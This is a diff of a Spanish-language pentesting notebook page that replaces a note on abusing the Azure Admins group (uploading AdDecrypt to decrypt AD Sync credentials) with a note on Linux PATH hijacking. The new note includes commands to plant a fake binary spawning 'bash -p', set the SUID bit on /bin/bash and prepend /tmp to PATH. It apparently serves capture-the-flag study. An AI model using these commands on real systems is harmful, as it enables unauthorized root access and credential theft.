@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Azure Admins | Notebook</title>
+    <title>Path Hijacking | Notebook</title>
     <script src="/theme.js"></script>
     <link rel="stylesheet" href="/section.css" />
   </head>
@@ -15,9 +15,9 @@
       <section class="notebook-workspace" aria-label="Notebook">
         <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
 
-        <article class="note-panel is-active" id="azure-admins">
+        <article class="note-panel is-active" id="path-hijacking">
           <div class="note-tabbar">
-            <span>Azure Admins</span>
+            <span>Path Hijacking</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -26,44 +26,46 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Escalada de Privilegios/Windows/Grupos</span>
+            <span>~/notebook/Escalada de Privilegios/Linux/Permisos y rutas</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">escalada de privilegios / windows / grupos</p>
-            <h2>Azure Admins</h2>
+            <p class="eyebrow">escalada de privilegios / linux / permisos y rutas</p>
+            <h2>Path Hijacking</h2>
 
-            <p><a href="https://github.com/VbScrub/AdSyncDecrypt">Repositorio GitHub</a> <a href="https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip">Payloads.zip</a></p>
+            <p>El path hijacking ocurre cuando un proceso privilegiado ejecuta comandos por nombre relativo y podemos colocar un binario controlado antes en el <code>PATH</code>.</p>
 
+            <p>1. Localizar un archivo que ejecute/importe un comando usando la <code>ruta relativa</code></p>
+            <p>2. Crear un binario controlado con el mismo nombre y modificar el PATH para que se ejecute</p>
             <section class="code-card">
-              <h3>Subir payloads y Ejecutarlo desde esa ruta</h3>
-              <pre><code># Subir payload AdDecrypt.exe
-# Subir payload mcrypt.dll
-cd 'C:\Program Files\Microsoft Azure AD Sync\Bin'
-# Ruta AdDecrypt.exe y mcrypt.dll
-C:\Users\&lt;user&gt;\Desktop\AdDecrypt.exe -FullSQL</code></pre>
+              <h3>Crear binario a suplantar: Abrir una bash como root</h3>
+              <pre><code>echo &quot;/bin/bash -p&quot; &gt; /tmp/&lt;binario&gt;</code></pre>
             </section>
+            <section class="code-card">
+              <h3>python</h3>
+              <pre><code>#!/bin/bash
+chmod u+s /bin/bash
 
-            <figure class="note-figure">
-              <img src="/notebook/assets/obsidian/windows-azure-admins.png" alt="Abuso del grupo Azure Admins" />
-            </figure>
+# Conexión a la bash como root: bash -p</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Modificar el PATH para que cuando se ejecute el archivo lea nuestro binario y se ejecute</h3>
+              <pre><code>export PATH=/tmp:$PATH</code></pre>
+            </section>
 
             <h2>Máquinas relacionadas</h2>
             <div class="notebook-related-links">
-              <a href="/writeups.html?machine=monteverde">Monteverde</a>
+              <a href="/writeups.html?machine=busqueda">Busqueda</a>
             </div>
 
             <h2>Tags</h2>
             <div class="tag-list">
               <span>notebook</span>
-              <span>windows</span>
+              <span>linux</span>
               <span>privesc</span>
               <span>escalada_privilegios</span>
-              <span>grupos</span>
-              <span>active_directory</span>
-              <span>azure</span>
-              <span>admins</span>
-              <span>azure_admins</span>
+              <span>path_hijacking</span>
+              <span>path</span>
             </div>
           </div>
         </article>
